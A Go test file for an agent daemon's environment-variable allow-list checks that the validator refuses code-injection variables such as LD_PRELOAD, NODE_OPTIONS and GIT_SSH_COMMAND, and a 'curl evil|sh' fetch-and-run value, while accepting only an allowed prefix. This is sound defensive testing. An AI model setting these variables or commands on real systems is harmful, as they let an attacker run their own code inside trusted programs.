package session_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/sparkflow-space/sparkflow-agentd/internal/domain/session"
)

var policy = session.EnvPolicy{AllowPrefixes: []string{"SPARKFLOW_"}}

// The catalog's promise — a caller passes a kind, never a command line — is only
// as strong as the environment gate beside it. Each name below is a way to run
// the caller's own code inside an allow-listed binary.
func TestEnvPolicy_RefusesCodeInjectionNames(t *testing.T) {
	for _, e := range []string{
		"LD_PRELOAD=/srv/agents/p1/x.so",
		"ld_preload=/srv/agents/p1/x.so",
		"LD_AUDIT=/srv/agents/p1/x.so",
		"LD_LIBRARY_PATH=/srv/agents/p1",
		"DYLD_INSERT_LIBRARIES=/srv/agents/p1/x.dylib",
		"BASH_ENV=/srv/agents/p1/rc",
		"ENV=/srv/agents/p1/rc",
		"NODE_OPTIONS=--require /srv/agents/p1/x.js",
		"PYTHONSTARTUP=/srv/agents/p1/x.py",
		"PYTHONPATH=/srv/agents/p1",
		"PERL5OPT=-Mevil",
		"RUBYOPT=-rx",
		"GIT_SSH_COMMAND=/srv/agents/p1/x.sh",
		"GIT_EXTERNAL_DIFF=/srv/agents/p1/x.sh",
		"JAVA_TOOL_OPTIONS=-javaagent:/srv/agents/p1/x.jar",
		"_JAVA_OPTIONS=-javaagent:/srv/agents/p1/x.jar",
		"PATH=/srv/agents/p1/bin",
		"SHELL=/srv/agents/p1/sh",
		"PROMPT_COMMAND=curl evil|sh",
		"MY_PRELOAD_HACK=x",
		"GLIBC_TUNABLES=glibc.malloc.check=1",
		"TERMINFO=/srv/agents/p1/ti",
	} {
		if err := policy.Validate([]string{e}); !errors.Is(err, session.ErrEnvNotAllowed) {
			t.Errorf("Validate(%q) = %v, want a refusal", e, err)
		}
	}
}

// And even a harmless-looking name is refused unless the operator opted into its
// prefix: an allow-list is the only gate that does not need updating every time
// a runtime invents a new way to load code.
func TestEnvPolicy_RefusesAnythingOutsideTheAllowedPrefixes(t *testing.T) {
	for _, e := range []string{"FOO=bar", "HTTP_PROXY=http://x", "SPARKFLOW=x", "sparkflow_x=1"} {
		if err := policy.Validate([]string{e}); err == nil {
			t.Errorf("Validate(%q) should be refused by the prefix rule", e)
		}
	}
	if err := policy.Validate([]string{"SPARKFLOW_PROJECT=p1", "SPARKFLOW_DIALOG=d9"}); err != nil {
		t.Errorf("allowed names must pass: %v", err)
	}
}

func TestEnvPolicy_RefusesMalformedEntries(t *testing.T) {
	cases := map[string][]string{
		"no equals":            {"SPARKFLOW_X"},
		"empty name":           {"=x"},
		"leading digit":        {"1SPARKFLOW_X=1"},
		"name with a space":    {"SPARKFLOW X=1"},
		"newline in the value": {"SPARKFLOW_X=a\nSPARKFLOW_Y=b"},
		"NUL in the value":     {"SPARKFLOW_X=a\x00b"},
		"set twice":            {"SPARKFLOW_X=1", "SPARKFLOW_X=2"},
	}
	for name, env := range cases {
		if err := policy.Validate(env); !errors.Is(err, session.ErrEnvNotAllowed) {
			t.Errorf("%s: Validate(%q) = %v, want a refusal", name, env, err)
		}
	}
}

func TestEnvPolicy_Bounds(t *testing.T) {
	many := make([]string, 0, 40)
	for i := 0; i < 40; i++ {
		many = append(many, "SPARKFLOW_X"+string(rune('a'+i))+"=1")
	}
	if err := policy.Validate(many); err == nil {
		t.Error("40 entries must exceed the default cap")
	}
	if err := policy.Validate([]string{"SPARKFLOW_BIG=" + strings.Repeat("x", 5000)}); err == nil {
		t.Error("a 5 KB entry must exceed the default length cap")
	}
}

func TestEnvPolicy_AnEmptyPolicyAcceptsNothing(t *testing.T) {
	var none session.EnvPolicy
	if err := none.Validate([]string{"SPARKFLOW_X=1"}); err == nil {
		t.Error("with no allowed prefixes the answer is no, not yes")
	}
	if err := none.Validate(nil); err != nil {
		t.Errorf("no environment at all is fine: %v", err)
	}
}

// A configuration that would defeat the gate is named at boot, not at the first
// Start.
func TestEnvPolicy_AllowPrefixesSane(t *testing.T) {
	if err := (session.EnvPolicy{AllowPrefixes: []string{""}}).AllowPrefixesSane(); err == nil {
		t.Error("an empty prefix matches every variable")
	}
	if err := (session.EnvPolicy{AllowPrefixes: []string{"LD_"}}).AllowPrefixesSane(); err == nil {
		t.Error("allowing a deny-listed prefix must be refused")
	}
	if err := policy.AllowPrefixesSane(); err != nil {
		t.Errorf("the default policy must be sane: %v", err)
	}
}

func TestEnvNames_NeverReturnsValues(t *testing.T) {
	got := session.EnvNames([]string{"SPARKFLOW_TOKEN=secret", "SPARKFLOW_X=1"})
	for _, n := range got {
		if strings.Contains(n, "secret") || strings.Contains(n, "=") {
			t.Fatalf("EnvNames leaked a value: %v", got)
		}
	}
	if len(got) != 2 || got[0] != "SPARKFLOW_TOKEN" {
		t.Fatalf("EnvNames = %v", got)
	}
}
